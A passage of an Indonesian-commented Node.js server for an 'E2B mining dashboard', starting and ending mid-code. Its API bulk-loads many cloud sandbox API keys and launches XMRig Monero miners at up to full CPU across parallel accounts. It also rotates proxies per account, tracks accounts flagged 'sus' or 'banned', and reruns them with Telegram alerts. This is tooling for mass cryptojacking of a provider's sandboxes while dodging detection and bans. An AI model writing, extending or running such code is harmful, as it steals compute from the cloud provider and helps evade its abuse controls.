      const icon = sb.hashrate_10s > 0 ? '🟢' : (sb.status === 'mining' ? '🟡' : '🔴');
      console.log(`  ${icon} Slot ${String(slot).padStart(2, '0')} [${(sb.id || '').slice(0, 16)}] [🛡️ Watchdog | CPU: ${sb.cpu_percent || curCpuPercent}%]: ${hrStr}`);
    }
    console.log(`===============================================================\n`);

    addLog(tokenId, `📊 ${miningCount} mining | Total: ${kH} kH/s (${totalHr.toFixed(1)} H/s)`);
    saveTokens();
    await broadcastState();

    await sleep(CHECK_INTERVAL);
  }
}

// ============================================================
// HTTP ROUTER & API
// ============================================================

function genId() { return Math.random().toString(36).slice(2, 10); }

async function handleRequest(req, res) {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  const pathname = url.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  const getBody = () => new Promise((resolve, reject) => {
    let d = '';
    req.on('data', c => (d += c));
    req.on('end', () => { try { resolve(JSON.parse(d || '{}')); } catch { resolve({}); } });
    req.on('error', reject);
  });

  const json = (data, status = 200) => {
    res.writeHead(status, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(data));
  };

  // GET /api/modes — Opsi eksekusi Docker Background (100% CPU) dan info durasi jam
  if (req.method === 'GET' && pathname === '/api/modes') {
    return json({
      modes: Object.values(EXEC_MODES),
      default_hours: DEFAULT_HOURS,
      max_hours: MAX_HOURS,
      min_hours: MIN_HOURS,
      default_mode: DEFAULT_EXEC_MODE,
      miner_types: Object.values(MINER_TYPES),
      default_miner: getActiveMiner(),
    });
  }

  // GET /api/config — Ambil konfigurasi sistem, RDP, miner, dan wallet
  if (req.method === 'GET' && pathname === '/api/config') {
    const activeM = getActiveMiner();
    const cfg = loadConfigFile();
    return json({
      wallet: getActiveWallet(),
      miner: activeM,
      miner_info: MINER_TYPES[activeM] || MINER_TYPES[DEFAULT_MINER_TYPE],
      miner_types: Object.values(MINER_TYPES),
      use_proxy: cfg.use_proxy === true,
      proxy_count: getProxyPool().length,
      rdp_name: RDP_NAME,
      hostname: os.hostname(),
      bot_token_masked: TELEGRAM_BOT_TOKEN ? `${TELEGRAM_BOT_TOKEN.slice(0, 10)}...` : '',
      chat_id: TELEGRAM_CHAT_ID,
    });
  }

  // GET /config.json — Akses langsung file konfigurasi wallet
  if (req.method === 'GET' && pathname === '/config.json') {
    return json(loadConfigFile());
  }

  // POST /api/config/proxy — Toggle status proxy (true/false) di config.json
  if (req.method === 'POST' && (pathname === '/api/config/proxy' || pathname === '/api/proxy')) {
    const body = await getBody();
    const useProxy = body.use_proxy === true || body.proxy === true || body.enabled === true;
    saveConfigFile(getActiveWallet(), 'xmrig', useProxy);
    _proxyAgentCache.clear();
    console.log(`[CONFIG] use_proxy diupdate via API: ${useProxy ? 'AKTIF (Menggunakan proxies.txt)' : 'NONAKTIF (Direct Connection)'}`);
    await broadcastState();
    return json({ ok: true, use_proxy: useProxy });
  }

  // POST /api/config/wallet — Ubah wallet address di config.json
  if (req.method === 'POST' && (pathname === '/api/config/wallet' || pathname === '/api/wallet')) {
    const body = await getBody();
    const newWallet = (body.wallet || '').trim();
    if (!newWallet) return json({ error: 'Wallet address tidak boleh kosong' }, 400);
    const curMiner = body.miner || body.miner_type || getActiveMiner();
    saveConfigFile(newWallet, curMiner);
    console.log(`[CONFIG] Wallet diupdate via API: '${newWallet}' (Miner: ${curMiner})`);
    for (const tid of Object.keys(tokens)) {
      if (tokens[tid] && tokens[tid].config) {
        tokens[tid].config.wallet = newWallet;
      }
    }
    saveTokens();
    await broadcastState();
    return json({ ok: true, wallet: newWallet, miner: curMiner });
  }

  // POST /api/config/miner — Software miner (XMRig) di config.json
  if (req.method === 'POST' && (pathname === '/api/config/miner' || pathname === '/api/miner')) {
    saveConfigFile(getActiveWallet(), 'xmrig');
    console.log(`[CONFIG] Default software miner diupdate via API: 'xmrig' (${MINER_TYPES.xmrig.name})`);
    for (const tid of Object.keys(tokens)) {
      if (tokens[tid] && tokens[tid].config) {
        tokens[tid].config.miner_type = 'xmrig';
      }
    }
    saveTokens();
    await broadcastState();
    return json({ ok: true, miner: 'xmrig', miner_info: MINER_TYPES.xmrig });
  }

  // POST /api/config/rdp-name — Ubah nama/label RDP
  if (req.method === 'POST' && pathname === '/api/config/rdp-name') {
    const body = await getBody();
    const newName = (body.rdp_name || body.name || '').trim();
    if (!newName) return json({ error: 'Nama RDP tidak boleh kosong' }, 400);
    RDP_NAME = newName;
    saveRdpName(newName);
    await broadcastState();
    return json({ ok: true, rdp_name: RDP_NAME });
  }

  // POST /api/telegram/test — Uji coba koneksi & pengiriman log ke bot Telegram
  if (req.method === 'POST' && pathname === '/api/telegram/test') {
    const timeStr = formatWIB();
    const testMsg = [
      `🤖 <b>[E2B MINING DASHBOARD — TELEGRAM BOT TEST]</b>`,
      `━━━━━━━━━━━━━━━━━━`,
      `✅ Integrasi notifikasi Telegram Bot <b>BERHASIL TERHUBUNG</b>!`,
      `🖥️ <b>RDP / Host:</b> <code>${escapeHtml(RDP_NAME)}</code>`,
      `🏷️ <b>Bot:</b> @LogsE2BS_Bot`,
      `🆔 <b>Chat ID:</b> <code>${TELEGRAM_CHAT_ID}</code>`,
      `📅 <b>Waktu:</b> ${timeStr}`,
      `━━━━━━━━━━━━━━━━━━`,
      `📢 Bot ini akan mengirimkan log otomatis saat:`,
      `• 🔄 <b>Akun Rerun:</b> Durasi sesi & nomor rerun (1x, 2x, dst)`,
      `• ⚠️ <b>Akun Sus:</b> Menit keberapa sus & status rerun saat sus`,
      `• 🚫 <b>Akun Banned:</b> Menit keberapa banned & status rerun saat banned`,
      `━━━━━━━━━━━━━━━━━━`,
      `<i>Status sistem: Berjalan di ${escapeHtml(RDP_NAME)} & siap memantau 24/7.</i>`
    ].join('\n');

    const result = await sendTelegramMessage(testMsg);
    if (!result.ok) {
      let advice = '';
      if (result.error && result.error.includes('chat not found')) {
        advice = 'Bot belum dimulai di Telegram. Buka https://t.me/LogsE2BS_Bot lalu tekan START (/start), kemudian coba lagi!';
      }
      return json({ ok: false, error: result.error, advice }, 400);
    }
    return json({ ok: true, message: `Pesan test berhasil dikirim dari ${RDP_NAME} ke Telegram (@LogsE2BS_Bot)!` });
  }

  // POST /api/tokens/:id/test-alert — Simulasi test notifikasi (rerun, sus, atau banned)
  const testAlertMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/test-alert$/);
  if (req.method === 'POST' && testAlertMatch) {
    const tokenId = testAlertMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const body = await getBody();
    const alertType = body.type || 'sus';

    if (alertType === 'rerun') {
      const prevMin = Math.max(1, Math.round((Date.now() - (tokens[tokenId].cycle_started_at || Date.now())) / 60000));
      tokens[tokenId].rerun_count = (tokens[tokenId].rerun_count || 0) + 1;
      tokens[tokenId].cycle_started_at = Date.now();
      saveTokens();
      await logTelegramRerun(tokenId, { prevMinutes: prevMin });
      return json({ ok: true, message: `Test notifikasi RERUN (ke-${tokens[tokenId].rerun_count}x) dikirim ke Telegram.` });
    } else if (alertType === 'sus') {
      await logTelegramSus(tokenId, body.reason || 'Simulasi deteksi sus: sandbox ditutup mendadak / rate limit cloud');
      return json({ ok: true, message: 'Test notifikasi SUS dikirim ke Telegram.' });
    } else if (alertType === 'banned') {
      const tokenSnap = {
        id: tokenId,
        name: tokens[tokenId].name,
        api_key: tokens[tokenId].api_key,
        rerun_count: tokens[tokenId].rerun_count || 0,
        run_started_at: tokens[tokenId].run_started_at,
        cycle_started_at: tokens[tokenId].cycle_started_at,
      };
      await logTelegramBanned(tokenSnap, body.reason || 'Simulasi banned: 401 Unauthorized (Invalid API Key / Revoked)');
      return json({ ok: true, message: 'Test notifikasi BANNED dikirim ke Telegram.' });
    }
    return json({ error: 'Tipe alert tidak valid (pilih: rerun, sus, banned)' }, 400);
  }

  // GET /api/tokens
  if (req.method === 'GET' && pathname === '/api/tokens') {
    return json({ tokens: getAllTokensSummary() });
  }

  // POST /api/tokens — Tambah E2B Token baru (Single)
  if (req.method === 'POST' && pathname === '/api/tokens') {
    const body = await getBody();
    const tokenId = genId();
    const apiKey = (body.api_key || body.e2b_key || body.key || '').trim();
    const wallet = (body.wallet || getActiveWallet()).trim();
    const minerType = normalizeMinerType(body.miner_type || body.miner || getActiveMiner());
    const total = Math.min(Math.max(parseInt(body.total, 10) || DEFAULT_TOTAL, 1), MAX_TOTAL);
    const cpuPercent = Math.min(100, Math.max(1, parseInt(body.cpu_percent || body.cpu || body.threads, 10) || DEFAULT_CPU_PERCENT));
    const threads = cpuPercentToThreads(cpuPercent);
    const hours = Math.min(Math.max(parseInt(body.hours || DEFAULT_HOURS, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
    const execMode = body.exec_mode && EXEC_MODES[body.exec_mode] ? body.exec_mode : DEFAULT_EXEC_MODE;
    const proxyUrl = (body.proxy_url || body.proxy || '').trim() || getNextPoolProxy();

    let name = (body.name || '').trim();
    if (!name || name.startsWith('e2b_') || name.length > 30) {
      name = `Token ${getNextTokenNumber()}`;
    }

    if (!apiKey) {
      return json({ error: 'E2B API Key wajib diisi (dapatkan di https://e2b.dev/dashboard)' }, 400);
    }

    // Cek apakah API Key ini sudah digunakan oleh token lain (anti key double)
    const existingToken = Object.entries(tokens).find(([, t]) => (t.api_key || '').trim() === apiKey);
    if (existingToken) {
      return json({
        error: `API Key ini sudah terdaftar pada token '${existingToken[1].name}'. API Key tidak boleh double! Hapus token '${existingToken[1].name}' terlebih dahulu jika ingin menggunakannya lagi.`
      }, 400);
    }

    tokens[tokenId] = {
      name,
      api_key: apiKey,
      proxy_url: proxyUrl,
      template_id: '', // Akan otomatis dibuild oleh runner
      template_status: 'none',
      run_started_at: null,
      cycle_started_at: null,
      rerun_count: 0,
      is_sus: false,
      sus_count: 0,
      last_sus_at: null,
      last_sus_reason: '',
      sandboxes: {},
      config: {
        total,
        cpus: REQUIRED_CPUS,
        memMb: REQUIRED_MEM_MB,
        wallet,
        miner_type: minerType,
        cpu_percent: cpuPercent,
        threads,
        hours,
        exec_mode: execMode,
      },
    };
    logs[tokenId] = [];
    saveTokens();
    const modeLabel = EXEC_MODES[execMode]?.name || execMode;
    const minerLabel = MINER_TYPES[minerType]?.name || minerType;
    console.log(`Token E2B '${name}' ditambahkan (${minerLabel}, ${modeLabel}, ${hours} Jam, CPU ${cpuPercent}% = ${threads} threads). Dimasukkan ke runner antrian paralel...`);
    await broadcastState();

    // Auto-start runner (akan langsung jalan paralel hingga 3 token)
    enqueueToken(tokenId);

    return json({ id: tokenId, name, hours, exec_mode: execMode, cpu_percent: cpuPercent, miner_type: minerType });
  }

  // POST /api/tokens/bulk — Tambah Banyak E2B Token Sekaligus (Bulk)
  if (req.method === 'POST' && pathname === '/api/tokens/bulk') {
    const body = await getBody();
    const rawKeys = body.keys || body.raw_keys || body.api_keys || '';
    const wallet = (body.wallet || getActiveWallet()).trim();
    const minerType = normalizeMinerType(body.miner_type || body.miner || getActiveMiner());
    const total = Math.min(Math.max(parseInt(body.total, 10) || DEFAULT_TOTAL, 1), MAX_TOTAL);
    const cpuPercent = Math.min(100, Math.max(1, parseInt(body.cpu_percent || body.cpu || body.threads, 10) || DEFAULT_CPU_PERCENT));
    const threads = cpuPercentToThreads(cpuPercent);
    const hours = Math.min(Math.max(parseInt(body.hours || DEFAULT_HOURS, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
    const execMode = body.exec_mode && EXEC_MODES[body.exec_mode] ? body.exec_mode : DEFAULT_EXEC_MODE;
    const bulkProxyBase = (body.proxy_url || body.proxy || '').trim();

    let keyList = [];
    if (Array.isArray(rawKeys)) {
      keyList = rawKeys.map(k => String(k).trim()).filter(Boolean);
    } else if (typeof rawKeys === 'string') {
      keyList = rawKeys
        .split(/[\r\n,;]+/)
        .map(k => k.trim())
        .filter(k => k.length > 5);
    }

    // Deduplikasi dalam input
    keyList = [...new Set(keyList)];

    if (!keyList.length) {
      return json({ error: 'Tidak ada E2B API Key yang valid ditemukan dalam input.' }, 400);
    }

    const added = [];
    const skipped = [];

    for (const apiKey of keyList) {
      // Cek apakah API Key sudah terdaftar
      const existing = Object.values(tokens).find(t => (t.api_key || '').trim() === apiKey);
      if (existing) {
        skipped.push({ key: apiKey.slice(0, 8) + '...', reason: `Sudah terdaftar pada '${existing.name}'` });
        continue;
      }

      const tokenId = genId();
      const tokenNum = getNextTokenNumber();
      const name = `Token ${tokenNum}`;

      tokens[tokenId] = {
        name,
        api_key: apiKey,
        proxy_url: bulkProxyBase || getNextPoolProxy(),
        template_id: '',
        template_status: 'none',
        run_started_at: null,
        cycle_started_at: null,
        rerun_count: 0,
        is_sus: false,
        sus_count: 0,
        last_sus_at: null,
        last_sus_reason: '',
        sandboxes: {},
        config: {
          total,
          cpus: REQUIRED_CPUS,
          memMb: REQUIRED_MEM_MB,
          wallet,
          miner_type: minerType,
          cpu_percent: cpuPercent,
          threads,
          hours,
          exec_mode: execMode,
        },
      };
      logs[tokenId] = [];
      const modeLabel = EXEC_MODES[execMode]?.name || execMode;
      const minerLabel = MINER_TYPES[minerType]?.name || minerType;
      console.log(`Token E2B '${name}' ditambahkan via Bulk Input (${minerLabel}, ${modeLabel}, ${hours} Jam, CPU ${cpuPercent}% = ${threads} threads).`);
      enqueueToken(tokenId);
      added.push({ id: tokenId, name, key: apiKey.slice(0, 8) + '...' });
    }

    saveTokens();
    await broadcastState();

    return json({
      ok: true,
      total_input: keyList.length,
      added_count: added.length,
      skipped_count: skipped.length,
      hours,
      exec_mode: execMode,
      cpu_percent: cpuPercent,
      miner_type: minerType,
      added,
      skipped,
      message: `Berhasil menambahkan ${added.length} token ke antrian paralel (${MINER_TYPES[minerType]?.name || minerType}, ${EXEC_MODES[execMode]?.name || execMode}, ${hours} Jam, CPU ${cpuPercent}%)!${skipped.length ? ` (${skipped.length} dilewati karena sudah ada)` : ''}`
    });
  }

  // POST /api/tokens/start-all — Jalankan semua token secara paralel (up to 3 akun bersamaan)
  if (req.method === 'POST' && pathname === '/api/tokens/start-all') {
    const body = await getBody();
    const newHours = body.hours ? Math.min(Math.max(parseInt(body.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS) : null;
    const newMode = (body.exec_mode && EXEC_MODES[body.exec_mode]) ? body.exec_mode : null;
    const newCpuPercent = body.cpu_percent ? Math.min(100, Math.max(1, parseInt(body.cpu_percent, 10) || DEFAULT_CPU_PERCENT)) : null;
    const newMinerType = (body.miner_type || body.miner) ? normalizeMinerType(body.miner_type || body.miner) : null;

    let queuedCount = 0;
    for (const [tid, t] of Object.entries(tokens)) {
      if (newHours) (t.config = t.config || {}).hours = newHours;
      if (newMode) (t.config = t.config || {}).exec_mode = newMode;
      if (newMinerType) {
        (t.config = t.config || {}).miner_type = newMinerType;
        for (const sb of Object.values(t.sandboxes || {})) {
          if (sb) sb.miner_type = newMinerType;
        }
      }
      if (newCpuPercent) {
        (t.config = t.config || {}).cpu_percent = newCpuPercent;
        t.config.threads = cpuPercentToThreads(newCpuPercent);
        for (const sb of Object.values(t.sandboxes || {})) {
          if (sb) {
            sb.cpu_percent = newCpuPercent;
            sb.threads = cpuPercentToThreads(newCpuPercent);
          }
        }
      }

      if (t.api_key && (!tasks[tid] || tasks[tid].done || tasks[tid].cancel)) {
        enqueueToken(tid);
        queuedCount++;
      }
    }
    saveTokens();
    await broadcastState();
    const minerMsg = newMinerType ? ` [Miner: ${MINER_TYPES[newMinerType]?.name || newMinerType}]` : '';
    const modeMsg = newMode ? ` [Mode: ${EXEC_MODES[newMode]?.name || newMode}]` : '';
    const hoursMsg = newHours ? ` [Durasi: ${newHours} Jam]` : '';
    const cpuMsg = newCpuPercent ? ` [CPU: ${newCpuPercent}%]` : '';
    return json({ ok: true, queued: queuedCount, message: `${queuedCount} token dimasukkan ke runner paralel.${minerMsg}${modeMsg}${hoursMsg}${cpuMsg}` });
  }

  // POST /api/tokens/stop-all — Hentikan semua token & kosongkan antrian
  if (req.method === 'POST' && pathname === '/api/tokens/stop-all') {
    sequenceQueue.length = 0;
    for (const [tid, ctrl] of Object.entries(tasks)) {
      if (ctrl) {
        ctrl.cancel = true;
        addLog(tid, '⛔ Runner dihentikan oleh Stop All.');
      }
    }
    activeProvisioningTokenIds.clear();
    await broadcastState();
    return json({ ok: true, message: 'Semua token dan antrian dihentikan.' });
  }

  // GET /api/debug/:tokenId/:sandboxId — Diagnosa langsung isi sandbox
  const debugMatch = pathname.match(/^\/api\/debug\/([^/]+)\/([^/]+)$/);
  if (req.method === 'GET' && debugMatch) {
    const [, tokenId, sandboxId] = debugMatch;
    const t = tokens[tokenId];
    if (!t) return json({ error: 'Token not found' }, 404);
    const diagCmd = `
echo "=== XMRIG VERSION ==="
/usr/local/bin/xmrig --version 2>&1
echo "=== XMRIG PROCESS ==="
pgrep -a xmrig 2>/dev/null || echo "NOT RUNNING"
echo "=== TEST LOG OUTPUT ==="
cat /tmp/xmrig.log 2>/dev/null || echo "NO LOG"
`;
    try {
      const out = await execInE2BSandbox(t.api_key, sandboxId, diagCmd, 30000, t.proxy_url);
      return json({ sandboxId, stdout: out.stdout, stderr: out.stderr, ok: out.ok });
    } catch (e) {
      return json({ error: e.message }, 500);
    }
  }

  // POST /api/tokens/:id/build-template — Force build template kustom baru 8 core / 8 GB
  const buildMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/build-template$/);
  if (req.method === 'POST' && buildMatch) {
    const tokenId = buildMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    if (!t.api_key) return json({ error: 'API Key belum diset' }, 400);

    addLog(tokenId, '🔨 Permintaan build template 8 Core / 8 GB diterima...');
    (async () => {
      const [newTid, err] = await buildMinerTemplate(t.api_key, tokenId, { skipCache: true });
      if (newTid) {
        t.template_id = newTid;
        (t.config = t.config || {}).template_id = newTid;
        saveTokens();
        await broadcastState();
      }
    })().catch(e => {
      addLog(tokenId, `❌ Error saat build template: ${e.message}`);
    });

    return json({ ok: true, message: 'Template build sedang berjalan di background' });
  }

  // POST /api/tokens/:id/rotate-proxy — Rotasi ke proxy berikutnya dari pool
  const rotateMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/rotate-proxy$/);
  if (req.method === 'POST' && rotateMatch) {
    const tokenId = rotateMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const newProxy = rotateTokenProxy(tokenId, 'manual dari dashboard');
    return json({ ok: true, proxy: newProxy, masked: maskProxy(newProxy) });
  }

  // POST /api/tokens/delete-selected ATAU DELETE /api/tokens/delete-selected — Hapus token yang dipilih (checkbox select)
  if ((req.method === 'DELETE' || req.method === 'POST') && pathname === '/api/tokens/delete-selected') {
    const body = await getBody();
    const ids = Array.isArray(body.ids) ? body.ids : [];
    if (!ids.length) return json({ error: 'Tidak ada token yang dipilih' }, 400);

    const shouldKill = body.kill === true;
    let deletedCount = 0;

    for (const tid of ids) {
      if (!tokens[tid]) continue;
      // Batalkan antrian & task
      const qIdx = sequenceQueue.indexOf(tid);
      if (qIdx !== -1) sequenceQueue.splice(qIdx, 1);
      activeProvisioningTokenIds.delete(tid);
      if (tasks[tid]) tasks[tid].cancel = true;

      // Hentikan container di cloud jika diminta
      if (shouldKill && tokens[tid].api_key && tokens[tid].sandboxes) {
        for (const sb of Object.values(tokens[tid].sandboxes)) {
          if (sb && sb.id) killE2BSandbox(tokens[tid].api_key, sb.id, tokens[tid].proxy_url).catch(() => { });
        }
      }

      delete tokens[tid];
      delete tasks[tid];
      delete logs[tid];
      deletedCount++;
    }

    saveTokens();
    await broadcastState();
    return json({ ok: true, count: deletedCount, message: `${deletedCount} token terpilih berhasil dihapus.` });
  }

  // POST /api/tokens/delete-inactive ATAU DELETE /api/tokens/delete-inactive — Hapus token yang TIDAK 'Mining Active'
  if ((req.method === 'DELETE' || req.method === 'POST') && pathname === '/api/tokens/delete-inactive') {
    const body = await getBody();
    const urlObj = new URL(req.url, `http://localhost:${PORT}`);
    const shouldKill = body.kill === true || urlObj.searchParams.get('kill') === 'true';

    let deletedCount = 0;
    const keptList = [];

    for (const [tid, t] of Object.entries(tokens)) {
      const isRunning = !!(tasks[tid] && !tasks[tid].done && !tasks[tid].cancel);
      const miningCount = Object.values(t.sandboxes || {}).filter(s => s.status === 'mining').length;
      const isMiningActive = isRunning && miningCount > 0;

      // Pertahankan jika token sedang aktif menambang (Mining Active)
      if (isMiningActive) {
        keptList.push(t.name);
        continue;
      }

      // Hapus token yang tidak aktif / stopped / idle
      const qIdx = sequenceQueue.indexOf(tid);
      if (qIdx !== -1) sequenceQueue.splice(qIdx, 1);
      activeProvisioningTokenIds.delete(tid);
      if (tasks[tid]) tasks[tid].cancel = true;

      if (shouldKill && t.api_key && t.sandboxes) {
        for (const sb of Object.values(t.sandboxes)) {
          if (sb && sb.id) killE2BSandbox(t.api_key, sb.id, t.proxy_url).catch(() => { });
        }
      }

      delete tokens[tid];
      delete tasks[tid];
      delete logs[tid];
      deletedCount++;
    }

    saveTokens();
    await broadcastState();
    return json({
      ok: true,
      deleted_count: deletedCount,
      kept_count: keptList.length,
      message: `${deletedCount} token yang tidak aktif berhasil dihapus. ${keptList.length} token Mining Active tetap berjalan.`
    });
  }

  // DELETE /api/tokens/delete-all ATAU DELETE /api/tokens — Hapus SEMUA token sekaligus
  if (req.method === 'DELETE' && (pathname === '/api/tokens/delete-all' || pathname === '/api/tokens')) {
    const urlObj = new URL(req.url, `http://localhost:${PORT}`);
    const shouldKill = urlObj.searchParams.get('kill') === 'true';

    sequenceQueue.length = 0;
    activeProvisioningTokenIds.clear();

    for (const [tid, ctrl] of Object.entries(tasks)) {
      if (ctrl) ctrl.cancel = true;
    }

    if (shouldKill) {
      // Hentikan dan hapus sandbox di E2B cloud untuk semua token
      for (const t of Object.values(tokens)) {
        if (t.api_key && t.sandboxes) {
          for (const sb of Object.values(t.sandboxes)) {
            if (sb && sb.id) killE2BSandbox(t.api_key, sb.id, t.proxy_url).catch(() => { });
          }
        }
      }
    }

    const count = Object.keys(tokens).length;
    for (const tid of Object.keys(tokens)) {
      delete tokens[tid];
      delete tasks[tid];
      delete logs[tid];
    }

    saveTokens();
    await broadcastState();
    return json({ ok: true, count, message: `${count} token berhasil dihapus.` });
  }

  // DELETE /api/tokens/:id
  const delMatch = pathname.match(/^\/api\/tokens\/([^/]+)$/);
  if (req.method === 'DELETE' && delMatch) {
    const tokenId = delMatch[1];
    if (tokenId === 'delete-all') return json({ ok: true });
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    if (tasks[tokenId]) tasks[tokenId].cancel = true;
    delete tokens[tokenId];
    delete tasks[tokenId];
    delete logs[tokenId];
    saveTokens();
    await broadcastState();
    return json({ ok: true });
  }

  // PUT /api/tokens/:id
  const putMatch = pathname.match(/^\/api\/tokens\/([^/]+)$/);
  if (req.method === 'PUT' && putMatch) {
    const tokenId = putMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const body = await getBody();
    const t = tokens[tokenId];
    if (body.name !== undefined) t.name = body.name;
    if (body.api_key !== undefined) {
      const trimmed = (body.api_key || '').trim();
      if (trimmed) {
        const dupToken = Object.entries(tokens).find(([id, tk]) => id !== tokenId && (tk.api_key || '').trim() === trimmed);
        if (dupToken) {
          return json({
            error: `API Key ini sudah digunakan oleh token '${dupToken[1].name}'. API Key tidak boleh double! Hapus token '${dupToken[1].name}' terlebih dahulu jika ingin menggunakannya lagi.`
          }, 400);
        }
      }
      t.api_key = trimmed;
    }
    if (body.proxy_url !== undefined) {
      const newProxy = normalizeProxyUrl(body.proxy_url);
      if (t.proxy_url !== newProxy) {
        t.proxy_url = newProxy;
        for (const sb of Object.values(t.sandboxes || {})) {
          if (sb && sb.id) sandboxCache.delete(sb.id);
        }
      }
    }
    if (body.template_id !== undefined) { t.template_id = body.template_id; (t.config = t.config || {}).template_id = body.template_id; }
    if (body.wallet !== undefined) (t.config = t.config || {}).wallet = body.wallet;
    if (body.miner_type !== undefined || body.miner !== undefined) {
      const mType = normalizeMinerType(body.miner_type || body.miner);
      (t.config = t.config || {}).miner_type = mType;
      for (const sb of Object.values(t.sandboxes || {})) {
        if (sb) sb.miner_type = mType;
      }
    }
    if (body.total !== undefined) (t.config = t.config || {}).total = Math.min(Math.max(parseInt(body.total, 10) || DEFAULT_TOTAL, 1), MAX_TOTAL);
    if (body.cpu_percent !== undefined) {
      const cpuP = Math.min(100, Math.max(1, parseInt(body.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
      (t.config = t.config || {}).cpu_percent = cpuP;
      t.config.threads = cpuPercentToThreads(cpuP);
      for (const sb of Object.values(t.sandboxes || {})) {
        if (sb) {
          sb.cpu_percent = cpuP;
          sb.threads = cpuPercentToThreads(cpuP);
        }
      }
    } else if (body.threads !== undefined) {
      (t.config = t.config || {}).threads = Math.min(Math.max(parseInt(body.threads, 10) || DEFAULT_THREADS, 1), 8);
    }
    if (body.hours !== undefined) (t.config = t.config || {}).hours = Math.min(Math.max(parseInt(body.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
    if (body.exec_mode !== undefined && EXEC_MODES[body.exec_mode]) (t.config = t.config || {}).exec_mode = body.exec_mode;
    saveTokens();
    const proxyInfo = t.proxy_url ? ` | Proxy: ${maskProxy(t.proxy_url)}` : '';
    const mLabel = MINER_TYPES[t.config?.miner_type]?.name || t.config?.miner_type || 'XMRig';
    addLog(tokenId, `✏️ Config diupdate untuk '${t.name}' (Miner: ${mLabel}, CPU: ${t.config?.cpu_percent || 100}%, Durasi: ${t.config?.hours} Jam${proxyInfo}).`);
    await broadcastState();
    return json({ ok: true });
  }

  // POST /api/tokens/:id/start — Jalankan token individual (masuk antrian runner paralel)
  const startMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/start$/);
  if (req.method === 'POST' && startMatch) {
    const tokenId = startMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const key = (tokens[tokenId].api_key || '').trim();
    if (!key) return json({ error: 'API Key belum diisi' }, 400);

    const body = await getBody();
    if (body.miner_type !== undefined || body.miner !== undefined) {
      const mType = normalizeMinerType(body.miner_type || body.miner);
      (tokens[tokenId].config = tokens[tokenId].config || {}).miner_type = mType;
      for (const sb of Object.values(tokens[tokenId].sandboxes || {})) {
        if (sb) sb.miner_type = mType;
      }
    }
    if (body.hours !== undefined) {
      (tokens[tokenId].config = tokens[tokenId].config || {}).hours = Math.min(Math.max(parseInt(body.hours, 10) || DEFAULT_HOURS, MIN_HOURS), MAX_HOURS);
    }
    if (body.cpu_percent !== undefined) {
      const cpuP = Math.min(100, Math.max(1, parseInt(body.cpu_percent, 10) || DEFAULT_CPU_PERCENT));
      (tokens[tokenId].config = tokens[tokenId].config || {}).cpu_percent = cpuP;
      tokens[tokenId].config.threads = cpuPercentToThreads(cpuP);
      for (const sb of Object.values(tokens[tokenId].sandboxes || {})) {
        if (sb) {
          sb.cpu_percent = cpuP;
          sb.threads = cpuPercentToThreads(cpuP);
        }
      }
    }
    if (body.exec_mode !== undefined && EXEC_MODES[body.exec_mode]) {
      (tokens[tokenId].config = tokens[tokenId].config || {}).exec_mode = body.exec_mode;
    }
    if (!tokens[tokenId].run_started_at || tasks[tokenId]?.cancel) {
      tokens[tokenId].cycle_started_at = Date.now();
      if (!tokens[tokenId].run_started_at) {
        tokens[tokenId].run_started_at = Date.now();
        tokens[tokenId].rerun_count = 0;
      }
    }
    saveTokens();

    for (const [otherId, otherToken] of Object.entries(tokens)) {
      if (otherId !== tokenId && (otherToken.api_key || '').trim() === key) {
        const isOtherActive = (tasks[otherId] && !tasks[otherId].cancel && !tasks[otherId].done) || sequenceQueue.includes(otherId) || activeProvisioningTokenIds.has(otherId);
        if (isOtherActive) {
          return json({
            error: `API Key ini sedang aktif digunakan oleh token '${otherToken.name}'. Token tidak bisa dijalankan bersamaan (key tidak boleh double). Hapus atau hentikan token '${otherToken.name}' terlebih dahulu.`
          }, 400);
        }
      }
    }

    if (tasks[tokenId] && !tasks[tokenId].cancel && !tasks[tokenId].done) {
      return json({ error: 'Token sudah berjalan atau dalam antrian' });
    }
    enqueueToken(tokenId);
    return json({ ok: true, message: 'Token dimasukkan ke antrian runner.' });
  }

  // POST /api/tokens/:id/stop — Hentikan token individual
  const stopMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/stop$/);
  if (req.method === 'POST' && stopMatch) {
    const tokenId = stopMatch[1];
    const qIdx = sequenceQueue.indexOf(tokenId);
    if (qIdx !== -1) {
      sequenceQueue.splice(qIdx, 1);
    }
    if (tasks[tokenId]) {
      tasks[tokenId].cancel = true;
      addLog(tokenId, '⛔ Runner dihentikan.');
    }
    if (activeProvisioningTokenIds.has(tokenId)) {
      activeProvisioningTokenIds.delete(tokenId);
    }
    await broadcastState();
    return json({ ok: true });
  }

  // GET /api/tokens/:id/logs
  const logsMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/logs$/);
  if (req.method === 'GET' && logsMatch) {
    return json({ logs: logs[logsMatch[1]] || [] });
  }

  // POST /api/tokens/:id/check — Fast Manual Check (All 20 in Parallel Batches)
  const checkMatch = pathname.match(/^\/api\/tokens\/([^/]+)\/check$/);
  if (req.method === 'POST' && checkMatch) {
    const tokenId = checkMatch[1];
    if (!tokens[tokenId]) return json({ error: 'Token not found' }, 404);
    const t = tokens[tokenId];
    console.log('🔍 Manual check diinisiasi (memeriksa seluruh container)...');
